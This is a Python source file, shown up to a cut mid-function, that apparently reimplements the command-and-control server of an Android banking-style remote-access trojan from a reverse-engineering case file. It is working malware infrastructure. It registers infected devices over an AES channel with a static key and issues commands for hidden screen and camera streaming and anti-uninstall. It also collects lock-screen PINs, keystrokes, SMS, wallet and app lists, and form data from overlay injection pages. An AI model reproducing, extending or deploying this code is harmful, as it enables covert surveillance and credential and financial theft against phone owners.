#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""· 控制台服务端（按已测绘协议实现，本地部署服务端源码）
实现范围（全部来自案卷实测/逆向得出的契约）：
  1) 设备注册    GET  /adv.php?apk=<id>&device=<android_id>   -> {"resOk":true,"token":<AES 配置>}
  2) 设备通道    GET  /io/?EIO=3&transport=websocket&apkid=&device=&ver=   (engine.io v3 + socket.io 帧)
  3) 设备->服务  "42["enc msg", <AES({"action","type":"enc","data"})>]"
  4) 服务->设备  "42["new_msg", <AES({"action","data"})>]"
  5) 运营侧 API  POST /api/login  /api/command  GET /api/devices  /api/device_log
运行： python refc2.py --host 127.0.0.1 --port 8788
"""
import argparse, asyncio, base64, gzip, json, os, re, secrets, sys, time, zlib
import xml.etree.ElementTree as ET

from aiohttp import web, WSMsgType
from Crypto.Cipher import AES

# 协议密钥（案卷 F-30：agent 侧 分发器.m907 使用 AES-128-ECB/PKCS5，静态密钥）
KEY = b'0623U25KTT3YO8P9'
APK_ID = '10020'
# 无论用 systemd 还是宝塔「Python 项目」启动，都把仓库根目录的 .env 读进来，
# 否则用面板 UI 启动时没有 REFC2_PASS，口令会退化成随机值 → 面板登录 invalid credentials。
def _load_dotenv():
    try:
        here = os.path.dirname(os.path.abspath(__file__))
        env_path = os.path.join(here, '..', '.env')
        if not os.path.isfile(env_path):
            return
        with open(env_path, encoding='utf-8') as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith('#') or '=' not in line:
                    continue
                k, v = line.split('=', 1)
                k, v = k.strip(), v.strip().strip('"').strip("'")
                if k and v and k not in os.environ:
                    os.environ[k] = v
    except Exception:
        pass


_load_dotenv()
OPERATOR_USER = os.environ.get('REFC2_USER', 'admin')
OPERATOR_PASS = os.environ.get('REFC2_PASS', 'mtx123')

STATE = {
    'devices': {},     # device_id -> {ws, apkid, last_seen, caps, shots:[], msgs:[]}
    'tokens': {},      # token -> {user, ts}
    'devlog': [],
    'reqlog': [],      # 控端接口访问留档：走查/回归用（method/path/status/query）
    'started': 0,
}
BOOT_TS = time.time()


def _remember_anti_uninstall(rec, enabled=None, status='confirmed', ts=None, pending=None):
    """Project the last known uninstall-protection state into the device row."""
    info = rec.setdefault('caps', {}).setdefault('device_info', {})
    if isinstance(enabled, bool):
        info['antiUninstall'] = enabled
    info['antiUninstallStatus'] = str(status or 'confirmed')
    info['antiUninstallUpdatedAt'] = int(ts or time.time())
    if isinstance(pending, bool):
        info['antiUninstallPending'] = pending
    else:
        info.pop('antiUninstallPending', None)
    state = {
        'status': info['antiUninstallStatus'],
        'updatedAt': info['antiUninstallUpdatedAt'],
    }
    if isinstance(info.get('antiUninstall'), bool):
        state['enabled'] = info['antiUninstall']
    if isinstance(info.get('antiUninstallPending'), bool):
        state['pending'] = info['antiUninstallPending']
    return state


def _persist_anti_uninstall(dev, state):
    try:
        import api_impl as _ai
        d = _ai.db()
        if d:
            d.kv_set('anti_uninstall_%s' % dev, state)
    except Exception:
        pass


def _restore_anti_uninstall(rec, dev):
    try:
        import api_impl as _ai
        d = _ai.db()
        state = d.kv_get('anti_uninstall_%s' % dev, {}) if d else {}
        if isinstance(state, dict):
            return _remember_anti_uninstall(
                rec, state.get('enabled'), state.get('status') or 'confirmed',
                state.get('updatedAt'), state.get('pending'))
    except Exception:
        pass
    return None


def aes_enc(plain: str) -> str:
    raw = plain.encode('utf-8')
    pad = 16 - (len(raw) % 16)
    raw += bytes([pad]) * pad
    return base64.b64encode(AES.new(KEY, AES.MODE_ECB).encrypt(raw)).decode()


def aes_dec(b64: str) -> str:
    data = base64.b64decode(b64)
    out = AES.new(KEY, AES.MODE_ECB).decrypt(data)
    if out:
        p = out[-1]
        if 0 < p <= 16:
            out = out[:-p]
    return out.decode('utf-8', 'replace')


# ---------------------------------------------------------------- 设备侧
async def adv_php(request):
    """设备注册：返回加密后的通道配置（原实现由域名探针调用）"""
    dev = request.query.get('device', '')
    apk = request.query.get('apk', APK_ID)
    forwarded_host = request.headers.get('X-Forwarded-Host') or request.host
    public_host = forwarded_host.split(',')[0].strip().split(':')[0]
    forwarded_proto = (request.headers.get('X-Forwarded-Proto') or request.scheme).split(',')[0].strip()
    cf_visitor = request.headers.get('CF-Visitor') or ''
    forwarded_port = request.headers.get('X-Forwarded-Port') or ''
    if forwarded_proto == 'https' or '"scheme":"https"' in cf_visitor.replace(' ', ''):
        public_port = 443
    elif forwarded_port.isdigit():
        public_port = int(forwarded_port)
    elif ':' in forwarded_host:
        try:
            public_port = int(forwarded_host.rsplit(':', 1)[1])
        except ValueError:
            public_port = 80
    elif public_host not in ('localhost', '127.0.0.1', '::1'):
        # 常见 Nginx 配置只转发 Host，不转发协议；公网域名由 TLS 入口反代时仍应回 443。
        public_port = 443
    else:
        public_port = 80
    # 客户端会把不含点的 host 与 domain 拼接；直接返回完整 FQDN，避免生成 www.<域名>。
    cfg = {'domain': public_host, 'host': public_host,
           'port': public_port, 't': int(time.time()), 'apk': apk, 'device': dev}
    return web.json_response({'resOk': True, 'token': aes_enc(json.dumps(cfg, separators=(',', ':')))})


async def device_log(request):
    try:
        body = await request.json()
    except Exception:
        body = {}
    STATE['devlog'].append({'ts': int(time.time()), 'body': body})
    dev = str(body.get('deviceId') or '') if isinstance(body, dict) else ''
    # 锁屏密码事件：转写进 keylogs（面板“系统锁屏”读的是 keylog）
    if dev and isinstance(body, dict) and body.get('type') == 'pin_capture':
        try:
            raw = body.get('msg') or ''
            j = json.loads(raw) if isinstance(raw, str) else (raw if isinstance(raw, dict) else {})
            ftype = str(j.get('type') or 'pin')
            val = str(j.get('value') or '')
            ok = j.get('ok')
            # 面板只展示内容，不显示"对/错"：早期拼了 "|fail" 后缀，
            # 用户看到 "1459|fail" 会困惑；对错信息仍保留在 devlog/ok 字段里
            if val:
                import api_impl as _ai
                d = _ai.db()
                if d:
                    d.keylog_add({'deviceId': dev, 'pkg': 'com.android.systemui',
                                  'type': ftype, 'text': val})
                else:
                    _ai.S['keylogs'].append({'deviceId': dev, 'pkg': 'com.android.systemui',
                                             'type': ftype, 'text': val, 'ts': int(time.time())})
                    _ai.save()
        except Exception:
            pass
    if dev and body.get('type') == 'acc_lifecycle':
        rec = STATE['devices'].setdefault(
            dev, {'ws': None, 'apkid': None, 'last_seen': time.time(),
                  'first_seen': time.time(), 'caps': {}, 'shots': [],
                  'msgs': [], 'frames': []})
        _merge_diag_caps(rec, body)
    return web.json_response({'ok': True})


BATTERY_KW_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'state', 'battery_kw.json')


async def battery_config(request):
    """电池白名单关键词远程配置。

    - 有 state/battery_kw.json（{brand: {battery_entry_kw:[], unrestricted_kw:[]}}）就按品牌下发；
    - 没有就返回 200 + 空配置：客户端缺省键会退回内置词表，
      但**非 200 会让客户端中断整个流程**，所以这里永远 200。
    """
    brand = (request.query.get('brand') or '').lower()
    table = {}
    try:
        with open(BATTERY_KW_FILE, encoding='utf-8') as f:
            table = json.load(f)
    except Exception:
        table = {}
    cfg = table.get(brand) if isinstance(table, dict) else None
    if not isinstance(cfg, dict):
        return web.json_response({'ok': True})
    out = {'ok': True}
    for k in ('battery_entry_kw', 'unrestricted_kw'):
        if isinstance(cfg.get(k), list):
            out[k] = cfg[k]
    return web.json_response(out)


async def ocr_captcha(request):
    """验证码 OCR 占位：先回 200，客户端走 OCR_FAILED 而不是 404（后面接引擎再实现）。"""
    return web.json_response({'ok': False, 'error': 'not implemented'})


async def device_socket(request):
    """设备通道：engine.io v3 握手 + socket.io 帧（websocket 直连档）"""
    ws = web.WebSocketResponse(heartbeat=None, max_msg_size=64 * 1024 * 1024)
    await ws.prepare(request)
    dev = request.query.get('device', '') or 'unknown'
    apkid = request.query.get('apkid', APK_ID)
    sid = secrets.token_hex(8)
    await ws.send_str('0' + json.dumps({'pingInterval': 45000, 'pingTimeout': 30000,
                                        'sid': sid, 'upgrades': []}))
    await ws.send_str('40')
    rec = STATE['devices'].setdefault(dev, {'ws': None, 'apkid': apkid, 'last_seen': 0,
                                            'first_seen': time.time(),
                                            'caps': {}, 'shots': [], 'msgs': []})
    rec['ws'] = ws
    rec['last_seen'] = time.time()
    rec.setdefault('first_seen', rec['last_seen'])
    _restore_anti_uninstall(rec, dev)
    # 设备重连/服务端重启后恢复持久化的归属（见 F-70）
    try:
        import api_impl as _ai
        d = _ai.db()
        if d and not rec.get('assigned_to'):
            rec['assigned_to'] = d.kv_get('assign_%s' % dev) or ''
    except Exception:
        pass
    try:
        import api_impl as _ai
        d = _ai.db()
        if d:
            d.upsert_device({'deviceId': dev, 'apkId': apkid, 'online': True,
                             'lastSeen': int(rec['last_seen']), 'shots': len(rec.get('shots', [])),
                             'caps': list(rec.get('caps', {}).keys())})
            d.add_event(dev, 'device_online', {'apkId': apkid})
    except Exception:
        pass
    print('[server] 设备上线 %s (apk=%s, 在线设备=%d)' % (dev, apkid, len(state_online())))
    try:
        asyncio.get_event_loop().create_task(_db_prune_loop())
    except Exception:
        pass
    try:
        asyncio.get_event_loop().create_task(_keylog_puller(dev))
    except Exception:
        pass
    try:
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                await on_device_frame(dev, msg.data, ws)
            elif msg.type == WSMsgType.BINARY:
                rec['msgs'].append(('binary', len(msg.data)))
    finally:
        if rec.get('ws') is ws:
            rec['ws'] = None
            rec['last_seen'] = time.time()
        print('[server] 设备下线 %s' % dev)
    return ws


CAM_PULL = {}          # dev -> asyncio.Task（摄像头窗口打开时按节奏取 camPic）


async def _cam_puller(dev):
    """摄像头窗口打开期间持续取帧：面板只在 `action==='camPic'` 的那一帧上更新 <img>。
    没有这个拉流，窗口就会永远停在"已连接，等待画面..."。"""
    try:
        while True:
            rec = STATE['devices'].get(dev)
            if not rec or not rec.get('ws'):
                return
            await asyncio.sleep(0.4)
            if not _PANEL_ALL and not (_PANEL_SUBS.get(dev) or []):
                return                      # 没有面板在看就别占设备
            # `camPic` 不是指令名（只是帧名），发了设备端只会回 unknown_action ——
            # 摄像头帧由设备端在 startCam 之后自己推（见 agent/refagent.cam_loop）
            await asyncio.sleep(1.0)
    except asyncio.CancelledError:
        return


def _cam_watch(dev, on):
    t = CAM_PULL.get(dev)
    if on:
        if t is None or t.done():
            CAM_PULL[dev] = asyncio.get_event_loop().create_task(_cam_puller(dev))
    elif t is not None:
        t.cancel()
        CAM_PULL.pop(dev, None)


STREAM_START_CMDS = ('startSilentStream', 'startHD', 'startAdbStream', 'startScreenRelay',
                    'screen_relay', 'ask_relay', 'startWebRTC')
STREAM_STOP_CMDS = ('stopSilentStream', 'stopHD', 'stopAdbStream', 'stopScreenRelay', 'stopWebRTC')


# 实时通道的观看者数量（由面板 WS 维护）—— 键盘记录只在没人看屏幕时采
WATCHERS = {}


_PRUNE_STARTED = {'v': False}


async def _db_prune_loop():
    """每 10 分钟跑一次库保留策略（幂等：多台设备只起一个循环）。

    设备每来一帧就写一条 device_events（~0.9 行/秒 ≈ 7.8 万行/天），不清理库会一直涨。
    """
    if _PRUNE_STARTED['v']:
        return
    _PRUNE_STARTED['v'] = True
    while True:
        await asyncio.sleep(600)
        try:
            import api_impl as _ai
            d = _ai.db()
            if d:
                n = d.prune_events()
                if n:
                    print('[db] 清理事件 %d 条' % n, flush=True)
        except Exception as e:
            print('[db] 清理循环异常: %s' % str(e)[:80], flush=True)


async def _keylog_puller(dev):
    """每 15s 试着采一次键盘记录。

    采集要靠设备端 `uiautomator dump`，而它需要系统 idle —— 只要有人在看这台设备的画面
    就会失败（实测：agent 一停 dump 立刻正常）。所以**有人看就不采**，没人看再采，
    既不打断操作者的实时画面，又能覆盖机群常态（没人在盯某一台时照样记录）。
    """
    while True:
        await asyncio.sleep(15)
        rec = STATE['devices'].get(dev)
        if not rec or not rec.get('ws'):
            return
        # `readKeylog` 不在 163 条指令表里（实测回 unknown_action）——
        # 键盘记录改由**设备端主动推** `cacheData`（k=keylog），服务端只负责落库，
        # 见 agent/refagent.keylog_loop 与 on_device_frame 里的 cacheData 分支。
        continue


KEEP_FRAMES = 300          # 每台设备在磁盘上保留的画面帧数（内存里的 bin_shots 更少）


def _prune_frames(outdir, rec, keep=KEEP_FRAMES):
    """只保留最近 keep 帧：删文件 + 同步内存里的 bin_shots。

    不清理的话：每帧 ~300KB、约 0.9 帧/秒 → 37 GB/天，盘满 = 服务端全面写失败。
    """
    try:
        shots = rec.get('bin_shots') or []
        if len(shots) > keep:
            for old in shots[:-keep]:
                try:
                    os.remove(os.path.join(outdir, old.get('file') or ''))
                except Exception:
                    pass
            del shots[:-keep]
        files = [f for f in os.listdir(outdir) if f.endswith(('.png', '.webp', '.bin'))]
        if len(files) > keep + 50:                 # 兜底：目录里还有历史残留
            files.sort()
            for f in files[:-keep]:
                try:
                    os.remove(os.path.join(outdir, f))
                except Exception:
                    pass
    except Exception as e:
        print('[binary] 清理画面帧失败: %s' % str(e)[:80], flush=True)


def state_online():
    return [d for d, r in STATE['devices'].items() if r.get('ws') is not None]


def _merge_diag_caps(rec, data):
    """把 2.1 客户端的 acc_lifecycle/diag 状态映射到设备列表字段。"""
    if not isinstance(data, dict):
        return
    # 不同 2.1 构建会把生命周期对象直接作为 data，或再包一层 msg/payload/data。
    for key in ('data', 'payload', 'msg', 'body'):
        nested = data.get(key)
        if isinstance(nested, str) and nested.lstrip().startswith('{'):
            try:
                nested = json.loads(nested)
            except Exception:
                nested = None
        if isinstance(nested, dict) and (
                isinstance(nested.get('permissions'), dict)
                or nested.get('type') == 'acc_lifecycle'):
            data = nested
            break
    perms = data.get('permissions') if isinstance(data.get('permissions'), dict) else {}
    lifecycle_connected = (str(data.get('type') or '') == 'acc_lifecycle'
                           and str(data.get('event') or '').lower()
                           in ('onserviceconnected', 'service_connected', 'connected'))
    accessibility = bool(perms.get('accessibility') or lifecycle_connected)
    rec['last_diag'] = dict(data)
    info = rec.setdefault('caps', {}).setdefault('device_info', {})
    for key in ('brand', 'model', 'sdk', 'battery', 'charging'):
        if key in data:
            info[key] = data[key]
    if 'accessibility' in perms or lifecycle_connected:
        info['accessibility'] = accessibility
        # 当前 React 面板沿用原版字段名 extra.deviceInfo.acc。
        info['acc'] = accessibility
        granted = rec['caps'].setdefault('permissions', {}).setdefault('granted', [])
        marker = 'BIND_ACCESSIBILITY_SERVICE'
        if accessibility and marker not in granted:
            granted.append(marker)
        elif not accessibility and marker in granted:
            granted.remove(marker)
        print('[server] 无障碍状态 %s（%s / %s，keys=%s）' %
              ('开' if accessibility else '关', data.get('type'), data.get('event'),
               ','.join(sorted(data.keys()))), flush=True)


def _merge_device_online(rec, data):
    """Merge the native 2.1 client's registration frame into panel fields.

    The source-built client reports ``action=deviceOnline`` and nests the
    useful values under ``data.deviceInfo``.  The older lab agent reports the
    same values as ``action=device_info``.  Keeping both forms in the same
    internal ``caps.device_info`` record makes the API projection independent
    of which client implementation connected.
    """
    if not isinstance(data, dict):
        return
    info = data.get('deviceInfo')
    if isinstance(info, str) and info.lstrip().startswith('{'):
        try:
            info = json.loads(info)
        except Exception:
            info = None
    if not isinstance(info, dict):
        return

    target = rec.setdefault('caps', {}).setdefault('device_info', {})
    aliases = {
        'brand': ('brand',),
        'model': ('model',),
        'android': ('android', 'androidVersion'),
        'sdk': ('sdk', 'version'),
        'region': ('region', 'area'),
        'country': ('country', 'area'),
        'network': ('network', 'netstate'),
        'battery': ('battery',),
        'charging': ('charging',),
        'screen': ('screen',),
        'screenWidth': ('screenWidth',),
        'screenHeight': ('screenHeight',),
        'lock': ('lock',),
        'sim': ('sim',),
        'appName': ('appName',),
        'accName': ('accName',),
        'apkVer': ('apkVer',),
        'pkg': ('pkg', 'myPkg'),
        'antiUninstall': ('antiUninstall', 'anti_uninstall'),
    }
    for dst, sources in aliases.items():
        for src in sources:
            if src in info and info[src] not in (None, ''):
                target[dst] = info[src]
                break

    if 'acc' in info:
        target['acc'] = bool(info.get('acc'))
        target['accessibility'] = bool(info.get('acc'))
        granted = rec['caps'].setdefault('permissions', {}).setdefault('granted', [])
        marker = 'BIND_ACCESSIBILITY_SERVICE'
        if target['accessibility'] and marker not in granted:
            granted.append(marker)
        elif not target['accessibility'] and marker in granted:
            granted.remove(marker)

    if 'antiUninstall' in target:
        raw_policy = target.get('antiUninstall')
        enabled = raw_policy is True or str(raw_policy).lower() in ('1', 'true', 'on')
        state = _remember_anti_uninstall(rec, enabled, 'confirmed')
        device_id = str(data.get('deviceId') or '')
        if device_id:
            _persist_anti_uninstall(device_id, state)

    wallpaper = info.get('wallpaper')
    if isinstance(wallpaper, str) and wallpaper:
        rec['wallpaper_b64'] = wallpaper
        target['hasWallpaper'] = True
    rec['appName'] = target.get('appName') or rec.get('appName') or ''
    rec['last_device_online'] = int(time.time())
    print('[server] deviceOnline merged %s/%s sdk=%s battery=%s app=%s wallpaper=%s' % (
          target.get('brand', ''), target.get('model', ''), target.get('sdk', ''),
          target.get('battery', ''), target.get('appName', ''),
          'yes' if rec.get('wallpaper_b64') else 'no'), flush=True)


def _wallpaper_bytes(rec):
    """Decode the thumbnail carried by ``deviceOnline`` for the image route."""
    raw = (rec or {}).get('wallpaper_b64')
    if not isinstance(raw, str) or not raw:
        return b'', ''
    if raw.startswith('data:'):
        header, _, raw = raw.partition(',')
        hinted = header[5:].split(';', 1)[0]
    else:
        hinted = ''
    try:
        data = base64.b64decode(raw)
    except Exception:
        return b'', ''
    if data.startswith(b'\x89PNG\r\n\x1a\n'):
        return data, 'image/png'
    if data.startswith(b'\xff\xd8\xff'):
        return data, 'image/jpeg'
    return (data, hinted) if data and hinted.startswith('image/') else (b'', '')


def _decode_tree_payload(data):
    """把 2.1 客户端的 UI 树信封转成服务端内部节点结构。

    真机上报格式是 ``{w,h,pkg,zip: base64(gzip(<hierarchy> XML))}``。
    """
    if not isinstance(data, dict):
        raise ValueError('tree payload must be an object')
    if isinstance(data.get('nodes'), list):
        return data
    packed = str(data.get('zip') or '')
    if not packed:
        raise ValueError('tree payload missing zip')
    compressed = base64.b64decode(packed)
    raw_bytes = None
    errors = []
    # 2.1 源码使用 Deflater(level=1, nowrap=true)，即无 zlib/gzip 头的 raw DEFLATE。
    # 同时兼容旧版 gzip 和常规 zlib 信封。
    for wbits in (-zlib.MAX_WBITS, zlib.MAX_WBITS, zlib.MAX_WBITS | 16):
        try:
            raw_bytes = zlib.decompress(compressed, wbits)
            break
        except zlib.error as e:
            errors.append(str(e))
    if raw_bytes is None:
        raise ValueError('tree deflate decode failed: %s' % '; '.join(errors))
    raw = raw_bytes.decode('utf-8', errors='replace')
    try:
        decoded = json.loads(raw)
        if isinstance(decoded, dict) and isinstance(decoded.get('nodes'), list):
            for key in ('w', 'h', 'pkg', 'ac'):
                decoded.setdefault(key, data.get(key))
            return decoded
    except json.JSONDecodeError:
        pass

    root = ET.fromstring(raw)
    nodes = []
    first_pkg = ''
    for elem in root.iter('node'):
        attr = elem.attrib
        nums = [int(x) for x in re.findall(r'-?\d+', attr.get('bounds', ''))]
        if len(nums) != 4:
            continue
        pkg = attr.get('package', '')
        if pkg and not first_pkg:
            first_pkg = pkg
        nodes.append({
            'bounds': nums,
            'text': attr.get('text', ''),
            'desc': attr.get('content-desc', ''),
            'cls': attr.get('class', ''),
            'id': attr.get('resource-id', ''),
            'pkg': pkg,
            'clickable': attr.get('clickable', 'false').lower() == 'true',
            'scrollable': attr.get('scrollable', 'false').lower() == 'true',
            'checked': attr.get('checked', 'false').lower() == 'true',
            'password': attr.get('password', 'false').lower() == 'true',
        })
    return {
        'w': int(data.get('w') or 1080),
        'h': int(data.get('h') or 2400),
        'pkg': first_pkg or str(data.get('pkg') or ''),
        'ac': str(data.get('ac') or ''),
        'nodes': nodes,
    }


def _tree_request_action(path):
    """UT 通道请求无障碍树；只有 ADB 专用通道请求 uiautomator 树。"""
    return 'adbUiTree' if path == '/api/adb-tree/ws' else 'capture'


def _cache_device_dataset(rec, dev, action, data):
    """Store list-style device replies so a browser refresh does not erase them."""
    bucket = {
        'iconList': 'apps', 'appList': 'apps', 'walletList': 'apps',
        'smsList': 'sms', 'readSmsList': 'sms',
        'albumList': 'album',
    }.get(str(action or ''))
    if not bucket or not isinstance(data, dict):
        return False
    now = int(time.time())
    rec.setdefault('datasets', {})[bucket] = {
        'action': action, 'data': data, 'checkedAt': now,
    }
    try:
        try:
            from . import api_impl as _ai
        except ImportError:
            import api_impl as _ai
        changed = _ai.cache_device_payload(dev, bucket, action, data, now)
        count = len(data.get('data') or data.get('list') or [])
        print('[server] %s cache %s (%d items, changed=%s)' %
              (dev, bucket, count, changed), flush=True)
        return True
    except Exception as e:
        print('[server] %s cache failed: %s' % (bucket, str(e)[:160]), flush=True)
        return False


async def on_device_frame(dev, text, ws):
    """解析设备来帧："42["enc msg", <b64>]" 等"""
    rec = STATE['devices'][dev]
    rec['last_seen'] = time.time()
    if text == '2':
        await ws.send_str('3')
        return
    if not text.startswith('42'):
        return
    try:
        arr = json.loads(text[2:])
    except Exception:
        return
    if not isinstance(arr, list) or not arr:
        return
    ev = arr[0]
    if ev == 'enc msg' and len(arr) > 1:
        try:
            inner = json.loads(aes_dec(arr[1]))
        except Exception as e:
            print('[server] 解密失败 %s' % e)
            return
        action = inner.get('action')
        data = inner.get('data') or {}
        if action == 'diag':
            print('[server] diag payload type=%s keys=%s sample=%s' %
                  (type(data).__name__,
                   ','.join(sorted(data.keys())) if isinstance(data, dict) else '-',
                   str(data)[:600]), flush=True)
            _merge_diag_caps(rec, data)
        if action == 'deviceOnline':
            _merge_device_online(rec, data)
        if action == 'action_result' and isinstance(data, dict):
            command = str(data.get('action') or '')
            if command in ('antiDeleteOn', 'antiDeleteOff'):
                effect = data.get('effect') if isinstance(data.get('effect'), dict) else {}
                expected = command == 'antiDeleteOn'
                success = bool(data.get('success'))
                enabled = effect.get('anti_uninstall')
                if success and not isinstance(enabled, bool):
                    enabled = expected
                if not success:
                    enabled = rec.get('caps', {}).get('device_info', {}).get('antiUninstall')
                state = _remember_anti_uninstall(rec, enabled, 'confirmed' if success else 'failed')
                _persist_anti_uninstall(dev, state)
        if action in ('device_info', 'permissions', 'adb_status'):
            rec['caps'][action] = data
        if action == 'screenshot':
            rec['shots'].append({'ts': int(time.time()),
                                 'bytes': int(data.get('imgLen') or 0)
                                 or len(str(data.get('img') or ''))})
            # 真机画面走二进制通道（见 binary 分支）；这里只在文本帧**确实带图**时兜底缓存
            try:
                png = base64.b64decode(str(data.get('img') or '')) if data.get('img') else b''
                if png[:8] == b'\x89PNG\r\n\x1a\n':
                    rec['last_screen'] = {'ts': time.time(), 'png': png, 'src': 'text'}
            except Exception as e:
                print('[panel] 画面帧解码失败: %s' % e, flush=True)
        if action == 'formData':
            # 原生桥 Android.returnResult / FKB.setFormData → socket 发 formData {data:"..."}
            payload = data.get('data', data)
            pkg = data.get('pkg') or data.get('packageName') or ''
            tpl = data.get('template') or ''
            if isinstance(payload, str):
                try:
                    obj = json.loads(payload)
                    pkg = pkg or obj.get('pkg', '')
                    payload = obj
                except Exception:
                    pass
            _store_injection(dev, pkg, tpl, payload, src='socket')
        if action == 'cacheData' and str(data.get('k') or '') == 'keylog':
            try:
                ents = json.loads(str(data.get('cache') or '[]'))
            except Exception:
                ents = []
            if ents:
                import api_impl as _ai
                for e in ents:
                    _ai.h_keylogs_add({'deviceId': dev, 'pkg': e.get('pkg'),
                                       'type': e.get('type') or 'text',
                                       'text': e.get('text')}, {}, 'device')
                print('[server] 键盘记录 +%d 条（%s）' % (len(ents), dev), flush=True)
        _cache_device_dataset(rec, dev, action, data)
        if action == 'capture':
            # 无障碍树：设备端是 gzip+base64 的节点树，面板要的是扁平 root[]（见厂商 bundle 解析逻辑）
            try:
                rec['last_tree'] = {'ts': time.time(), 'tree': _decode_tree_payload(data)}
            except Exception as e:
                print('[server] capture 树解码失败: %s' % str(e)[:120], flush=True)
        rec['msgs'].append({'ts': int(time.time()), 'action': action})
        # 完整回帧留档：被控端 163 条指令的端到端机械判据靠它核对帧名与字段
        rec.setdefault('frames', []).append({
            'ts': int(time.time()), 'action': action,
            'data': data if isinstance(data, dict) else {'raw': str(data)[:2000]},
            'keys': sorted(data.keys()) if isinstance(data, dict) else []})
        if len(rec['frames']) > 2000:
            del rec['frames'][:-1000]
        try:
            import api_impl as _ai
            d = _ai.db()
            if d:
                d.add_event(dev, action, data if not isinstance(data, dict) or len(str(data)) < 3000 else {})
                if action == 'screenshot':
                    d.upsert_device({'deviceId': dev, 'apkId': rec.get('apkid'), 'online': True,
                                     'lastSeen': int(rec['last_seen']), 'shots': len(rec['shots']),
                                     'caps': list(rec.get('caps', {}).keys())})
        except Exception:
            pass
        print('[server] <<< %s 来自 %s' % (action, dev))
        # 转发给订阅了这台设备的面板连接（主通道 /ws/dashboard）；面板浮窗（摄像头/阅读器/HD）
        # 就是靠这条 `device_message` 事件拿数据的 —— 不转发它们只会显示"等待画面"
        _msg = json.dumps({'event': 'device_message', 'deviceId': dev,
                           'action': action, 'data': data}, ensure_ascii=False)
        for _pws in list(set(list(_PANEL_SUBS.get(dev) or []) + list(_PANEL_ALL))):
            try:
                await _pws.send_str(_msg)
            except Exception:
                for _lst in (_PANEL_SUBS.get(dev) or [], _PANEL_ALL):
                    try:
                        _lst.remove(_pws)
                    except Exception:
                        pass


async def send_command(dev, action, data=None):
    """下发指令帧：{"action": <名>, "data": {…参数…}}

    历史缺陷（F-56）：早期实现把 data 的键**平铺**到顶层（{"action":A,"pagesize":1}），
    而被控端分发器 `分发器.m1627(String action, JSONObject data)` 取的是 `data` 子对象 ——
    结果参数从来没真正送到设备侧（帧结构对、参数全丢）。现按协议放回 `data`。
    """
    rec = STATE['devices'].get(dev)
    if not rec or not rec.get('ws'):
        return False
    if action in ('antiDeleteOn', 'antiDeleteOff'):
        current = rec.get('caps', {}).get('device_info', {}).get('antiUninstall')
        state = _remember_anti_uninstall(
            rec, current, 'pending', pending=action == 'antiDeleteOn')
        _persist_anti_uninstall(dev, state)
    # 投屏开关：面板的「静默投屏 / 停止」按钮要真的影响拉流节奏
    if action in STREAM_START_CMDS:
        rec['stream_on'] = True
    elif action in STREAM_STOP_CMDS:
        rec['stream_on'] = False
    if action in ('startCam', 'setCam'):
        _cam_watch(dev, True)
    elif action in ('stopCam',):
        _cam_watch(dev, False)
    payload = {'action': action, 'data': data if isinstance(data, dict) else {}}
    frame = '42' + json.dumps(['new_msg', aes_enc(json.dumps(payload, separators=(',', ':'))),
                               ], ensure_ascii=False)
    await rec['ws'].send_str(frame)
    return True


# ---------------------------------------------------------------- 运营侧
async def api_login(request):
    body = await request.json()
    _user = body.get('username')
    _pass = body.get('password')
    ok = False
    role = 'user'
    if _user == OPERATOR_USER:
        role = 'admin'
        stored = None
        try:
            import api_impl as _ai
            d0 = _ai.db()
            stored = d0.kv_get('pw_%s' % _user) if d0 else None
        except Exception:
            stored = None
        if stored and '$' in stored:
            # 改过密：以 DB 哈希为准（`/api/me/password` 写入），环境变量口令仍作为初始口令
            import hashlib as _h
            salt, h = stored.split('$', 1)
            ok = _h.sha256((salt + (_pass or '')).encode()).hexdigest() == h or _pass == OPERATOR_PASS
        else:
            ok = _pass == OPERATOR_PASS
    else:
        # 子账号（由 /api/users 创建）：用库里的密码哈希校验，role 取自用户记录（见 F-68）
        role = 'user'
        try:
            import api_impl as _ai
            d0 = _ai.db()
            stored = d0.kv_get('pw_%s' % _user) if d0 else None
            u = next((r for r in (_ai.S.get('users') or []) if r.get('username') == _user), None)
            if not u and d0:
                u = next((r for r in d0.users() if r.get('username') == _user), None)
            if u and stored and '$' in stored and _pass:
                import hashlib as _h
                salt, h = stored.split('$', 1)
                ok = _h.sha256((salt + _pass).encode()).hexdigest() == h
                role = u.get('role') or 'user'
        except Exception:
            ok = False
    if ok:
        tok = secrets.token_urlsafe(24)
        STATE['tokens'][tok] = {'user': _user, 'role': role, 'realm': 'primary', 'ts': time.time()}
        try:
            import api_impl as _ai
            d = _ai.db()
            if d:
                d.session_add(tok, _user)
                d.ensure_user(_user, role)
                d.audit(_user, 'login', request.remote)
        except Exception:
            pass
        return web.json_response({'ok': True, 'token': tok, 'user': _user, 'role': role,
                                  'store': 'sqlite'})
    return web.json_response({'ok': False, 'error': 'invalid credentials'}, status=401)


def _token_row(tok, realm=None):
    """会话解析：内存优先，落空则查 DB（服务端重启后仍认旧 token，与原版 DB session 一致）。
    realm：'primary' / 'relay' —— **两套 C2 的 token 不通用**（见 F-71）。"""
    if not tok:
        return None
    row = STATE['tokens'].get(tok)
    if not row:
        try:
            import api_impl as _ai
            d = _ai.db()
            got = d.session_get(tok) if d else None
        except Exception as e:
            print('[auth] session_get 异常: %s' % e, flush=True)
            got = None
        if got:
            row = {'user': got.get('actor'), 'ts': got.get('ts') or time.time()}
            STATE['tokens'][tok] = row
        else:
            print('[auth] token %s… 内存与 DB 均无' % tok[:12], flush=True)
            return None
    r = row.get('realm')
    if realm and r and r != realm:
        return None
    return row


def _store_injection(dev, pkg, tpl, data, src='http'):
    """注入页上报统一落库：keylogs（面板"键盘记录"）+ inj_records（注入记录）。

    两种协议共用：
      - HTML 直接 POST /api/inj/result      → src=http
      - 原生桥 Android.returnResult/setFormData → 设备 socket 的 formData 动作 → src=socket
    """
    import api_impl as _ai
    dev = str(dev or '').strip()
    pkg = str(pkg or '').strip()
    tpl = str(tpl or '').strip()
    if not dev:
        print('[inj] 丢弃：没有 deviceId', flush=True)
        return False
    if isinstance(data, (dict, list)):
        text = json.dumps(data, ensure_ascii=False)
    else:
        text = str(data or '')
    try:
        _ai.h_keylogs_add({'deviceId': dev, 'pkg': pkg, 'type': 'form', 'text': text}, {}, 'device')
        if pkg:
            _dbx = _ai.db()
            if _dbx:
